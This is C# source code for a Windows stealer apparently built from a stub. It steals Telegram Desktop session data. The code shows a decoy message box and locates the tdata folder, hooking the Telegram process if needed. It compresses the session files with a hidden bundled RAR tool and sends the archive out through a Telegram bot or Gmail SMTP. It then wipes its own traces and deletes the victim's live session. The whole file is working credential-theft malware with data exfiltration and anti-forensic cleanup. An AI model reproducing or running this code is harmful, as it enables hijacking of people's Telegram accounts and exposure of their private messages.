using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Payload
{
    class Program
    {
        #region Variables
        private static string Session;
        private static string Token;
        private static string ID;
        private static string Method;
        private static bool UseProxy;
        private static string ProxyIP;
        private static string ProxyPort;
        private static string SenderEmail;
        private static string RecieverEmail;
        private static string SenderEmailPassword;
        private static string TGVersion;
        private static string TDLocation;
        #endregion

        #region Main
        static void Main()
        {
            var Config = ReadConfigs();

            #region ParseConfig
            string fakeMessageConfigs = "";

            if (Config[0] == "0")
            {
                #region ParseTelegramApiConfig
                try
                {
                    Token = Config[2];
                    ID = Config[3];
                    fakeMessageConfigs = Config[4];
                    Method = "Telegram";
                    UseProxy = int.Parse(Config[1]) == 1;
                    if (UseProxy)
                    {
                        var ProxyConfig = Config[2].Split('~');
                        ProxyIP = ProxyConfig[0];
                        ProxyPort = ProxyConfig[1];
                    }
                }
                catch { }
                #endregion
            }
            else
            {
                #region ParseGmailApiConfig
                try
                {
                    var GmailConfig = Config[1].Split('~');
                    SenderEmail = GmailConfig[0];
                    SenderEmailPassword = GmailConfig[1];
                    RecieverEmail = GmailConfig[2];
                    fakeMessageConfigs = Config[2];
                }
                catch (Exception) { }
                #endregion
            }
            #endregion

            FakeMessager(fakeMessageConfigs);

            EXPL0IT();

            #region SendSession
            Thread.Sleep(1000);
            if (File.Exists(Session))
            {
                SendTData(Session);
            }
            Thread.Sleep(1000);
            ClearLogs();
            Application.Exit();
            #endregion

            KillCurrentSession(TDLocation);

        }
        #endregion

        #region Functions

        #region ReadConfigs
        private static string[] ReadConfigs()
        {
            string[] Config = new string[6];

            try
            {
                try
                {
                    byte[] Stub = File.ReadAllBytes(Application.ExecutablePath.ToString());
                    byte[] ConfigArry = new byte[1024];
                    Array.ConstrainedCopy(Stub, Stub.Length - 1024, ConfigArry, 0, 1024);
                    ConfigArry = Reverse(ConfigArry);
                    string ConfigString = Encoding.UTF8.GetString(ConfigArry).TrimEnd('\x00');
                    Config = ConfigString.Split('`');
                }
                catch { Application.Exit(); }
            }
            catch { }
            return Config;
        }
        #endregion

        #region FakeMessanged
        private static void FakeMessager(string fakeMessageConfigs)
        {
            if (fakeMessageConfigs != "0~0~0")
            {
                try
                {
                    string[] FMC = fakeMessageConfigs.Split('~');
                    string Type = FMC[0];
                    string Title = FMC[1];
                    string Body = FMC[2];
                    if (Type == "Warning")
                    {
                        MessageBox.Show(Body, Title, MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    }
                    else if (Type == "Info")
                    {
                        MessageBox.Show(Body, Title, MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                    else if (Type == "Error")
                    {
                        MessageBox.Show(Body, Title, MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
                catch { }
            }
        }
        #endregion

        #region ClearLogs
        static void ClearLogs()
        {
            try
            {
                Thread.Sleep(5000);
                String Temp = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\TSH";
                DirectoryInfo Dir = new DirectoryInfo(Temp);
                foreach (FileInfo SingleFile in Dir.GetFiles())
                {
                    SingleFile.Delete();
                }
                foreach (DirectoryInfo SingleDirectory in Dir.GetDirectories())
                {
                    SingleDirectory.Delete(true);
                }
                Directory.Delete(Temp);
                string Romaing = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string[] Compress = { Romaing + @"\rar_cli.exe", Romaing + @"\Session.rar" };
                File.Delete(Compress[0]);
                File.Delete(Compress[1]);
            }
            catch (Exception)
            { }
        }
        #endregion

        #region Reporter
        private static void Report2Tel(string msg)
        {
            if (Method == "Telegram")
            {
                string _Url = "https://api.telegram.org/bot" + Token + "/sendMessage?chat_id=" + ID + "&parse_mode=html&text=<b>" + msg + "</b>";
                try
                {
                    WebClient client = new WebClient();
                    if (UseProxy)
                        client.Proxy = new WebProxy(ProxyIP, int.Parse(ProxyPort));
                    string str = client.DownloadString(_Url);
                }
                catch
                {

                }
            }
        }
        #endregion

        #region TryHookProccess
        private static string TryHookProccess()
        {
            bool HookedTelegram = false;
            string SessionLocation = null;
            try
            {
                Process[] process = Process.GetProcesses();
                foreach (Process prs in process)
                {
                    if (prs.ProcessName == "Telegram")
                    {
                        Report2Tel("Detected Telegram !");
                        Report2Tel("Proccess: " + prs.ProcessName);
                    ReErr:
                        try
                        {
                            Report2Tel("Location: " + prs.MainModule.FileName);
                        }
                        catch
                        {
                            goto ReErr;
                        }
                        SessionLocation = prs.MainModule.FileName.Replace("\\Telegram.exe", "") + "\\tdata";
                        Report2Tel("Session Location: " + SessionLocation);
                        HookedTelegram = true;
                        break;//if we dont break here and another telegram proccess exists, then TryHookProcess will hook last one (in this case second one)
                    }

                }
            }
            catch { }
            if (!HookedTelegram)
            {
                return "NotHooked";
            }
            else
            {
                return SessionLocation;
            }
        }
        #endregion

        #region HuntSession
        private static string HuntSession(string TDataLocation)
        {
            string Temp = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\TSH";
            Directory.CreateDirectory(Temp);
            string[] Files, Directoryes;
            string SuperDirectory = null;

            #region Get Session
            try
            {
                if (Directory.Exists(Temp))
                {
                    DirectoryInfo dir = new DirectoryInfo(Temp);
                    dir.Delete(true);
                }
            }
            catch { }

            if (Directory.Exists(TDataLocation)) //Get Telegram Session
            {
                Files = Directory.GetFiles(TDataLocation);
                Directoryes = Directory.GetDirectories(TDataLocation);
                Directory.CreateDirectory(Temp + @"\TelegramSession\" + "tdata");
                foreach (var Single in Directoryes)
                {
                    try
                    {

                        DirectoryInfo Check = new DirectoryInfo(Single);
                        if (Convert.ToInt64(Check.Name.Length) > 15)
                        {
                            Directory.CreateDirectory(Temp + @"\TelegramSession\" + @"tdata\" + Check.Name);
                            SuperDirectory = Check.Name;
                        }
                    }
                    catch { }
                }
                foreach (var Single in Files)
                {
                    try
                    {
                        FileInfo Check = new FileInfo(Single);
                        if (Convert.ToInt64(Check.Length) < 5000 &&
                            Check.Name.Length > 15 &&
                            Path.GetExtension(Single) != ".json")
                        {
                            File.Copy(Single, Temp + @"\TelegramSession\" + @"tdata\" + Check.Name);
                        }
                    }
                    catch (Exception) { }
                }
                string[] Map =
                        {
                         TDataLocation + @"\" + SuperDirectory + @"\map0",
                         TDataLocation + @"\" + SuperDirectory + @"\map1"
                        };
                if (File.Exists(Map[0]))
                {
                    File.Copy(Map[0], Temp + @"\TelegramSession\" + @"tdata\" + SuperDirectory + @"\" + "map0");
                }
                if (File.Exists(Map[1]))
                {
                    File.Copy(Map[1], Temp + @"\TelegramSession\" + @"tdata\" + SuperDirectory + @"\" + "map1");
                }
                TDLocation = TDataLocation;
            }
            #endregion

            return CompressSession(Temp + @"\TelegramSession\");
        }
        #endregion

        #region KillCurrentSession
        private static void KillCurrentSession(string SessionPath)
        {
            try
            {

                var telegrams = Process.GetProcessesByName("Telegram");
                foreach (var telegram in telegrams)
                    telegram.Kill();
            }
            catch (Exception ex)
            {
                Report2Tel("[Kill Target Session: KillProcess] - Error: " + ex.Message);
            }

            try
            {
                var tdata = new DirectoryInfo(SessionPath);
                foreach (var file in tdata.GetFiles())
                {
                    if (file.Name == "working")
                        continue;
                    file.Delete();
                }
            }
            catch (Exception ex)
            {
                Report2Tel("[Kill Target Session: DeleteSession] - Error: " + ex.Message);
            }
        }
        #endregion

        #region Compress
        private static string CompressSession(string TDataLocation)
        {
            #region Run RAR Proccess
            string RCL = TDataLocation.Replace("\\tdata", "");
            try
            {
                Report2Tel("Compressing Session...");
                File.WriteAllBytes(RCL + @"\rar_cli.exe", Properties.Resources.rar_cli);
                System.Diagnostics.Process cmd = new System.Diagnostics.Process();
                cmd.StartInfo.WorkingDirectory = RCL;
                cmd.StartInfo.FileName = "rar_cli.exe";
                cmd.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                cmd.StartInfo.Arguments = "a -ep1 -r Session.rar tdata";
                cmd.Start();
            }
            catch { }
            #endregion
            string _location = TDataLocation.Replace("tdata", "");
            return TDataLocation + @"\Session.rar";

        }
        #endregion

        #region SendTData
        private static void SendTData(string TData)
        {
            if (Method == "Telegram")
            {
                Report2Tel("Sending TData... 🥳");
                byte[] _File_Bytes = File.ReadAllBytes(TData);
                string _File_Name = TData;
                string _Url = "https://api.telegram.org/bot" + Token + "/sendDocument?chat_id=" + ID + "&caption=There you go!";
                UploadMultipart(_File_Bytes, _File_Name, "application/x-ms-dos-executable", _Url);
            }
            else
            {
                SendMail(TData, RecieverEmail, SenderEmailPassword, SenderEmail);
            }

        }
        #endregion

        #region Telegram Bot HTTP Post
        private static void UploadMultipart(byte[] file, string filename, string contentType, string url)
        {
            try
            {
                var client = new WebClient();
                if (UseProxy)
                    client.Proxy = new WebProxy(ProxyIP, int.Parse(ProxyPort));
                string boundary = "------------------------" + DateTime.Now.Ticks.ToString("x");
                client.Headers.Add("Content-Type", "multipart/form-data; boundary=" + boundary);
                var fileData = client.Encoding.GetString(file);
                var package = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", boundary, filename, contentType, fileData);
                var nfile = client.Encoding.GetBytes(package);
                byte[] resp = client.UploadData(url, "POST", nfile);

                Environment.Exit(0);
            }
            catch { }
        }
        #endregion

        #region SendMail
        static void SendMail(string Attach, string From, string Password, string TO)
        {
            try
            {
                MailMessage Transfer = new MailMessage();
                SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
                Transfer.From = new MailAddress(From);
                Transfer.Subject = "[Telegram Session]";
                Transfer.Body =
                "MachineName: " + Environment.MachineName.ToString() + Environment.NewLine
              + "OperationSystem: " + Environment.OSVersion.ToString() + Environment.NewLine
              + "Telegram Version: " + TGVersion + Environment.NewLine;
                var Attachment = new Attachment(Attach);
                Transfer.Attachments.Add(Attachment);
                SmtpServer.Port = 587;
                SmtpServer.Credentials = new NetworkCredential(From, Password);
                Transfer.To.Add(TO);
                SmtpServer.EnableSsl = true;
                SmtpServer.Send(Transfer);
                Transfer.Dispose();

            }
            catch (Exception)
            { }
        }
        #endregion

        #region Reverse
        static byte[] Reverse(byte[] Data)
        {
            byte[] Temp = new byte[Data.Length];
            for (int i = 0; i < Data.Length; i++)
            {
                Temp[(Temp.Length - 1) - i] = Data[i];
            }
            return Temp;
        }
        #endregion

        #region GetTelegramVersion
        private static string GetTelegramVersion(string tdataPath)
        {
            string TGPath = tdataPath.Replace("tdata", "Telegram.exe");
            var version = FileVersionInfo.GetVersionInfo(TGPath).ProductVersion;
            return version;
        }
        #endregion

        #region EXPL0IT
        private static void EXPL0IT()
        {
            string TDataDefaultLocation = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Telegram Desktop\tdata";
            Report2Tel("Checking Default Location...");
            if (Directory.Exists(TDataDefaultLocation))
            {

                Report2Tel("Detected session!" + Environment.NewLine + "NOTE: User Used Default Location 😁");
                TGVersion = GetTelegramVersion(TDataDefaultLocation);
                Report2Tel("Telegram Version: " + TGVersion);
                Session = HuntSession(TDataDefaultLocation);
            }
            else
            {
                Report2Tel("Tdata not exists, User is using Custom Location 🙃");

                #region Wait For Proccess
                Report2Tel("Waiting for telegram proccess to track tdata location... 😎");
                string SessionLocation = TryHookProccess();
                if (SessionLocation != "NotHooked")
                {
                    Session = HuntSession(SessionLocation);
                }
                Report2Tel("Telegram is not running! Waiting for process... 🧐");

                while (SessionLocation == "NotHooked")
                {
                    try
                    {
                        SessionLocation = TryHookProccess();
                    }
                    catch { }
                    Thread.Sleep(50);
                }
                Thread.Sleep(100);

                if (SessionLocation != "NotHooked")
                {
                    Session = HuntSession(SessionLocation);
                }
                #endregion
            }
        }
        #endregion

        #endregion
    }
}
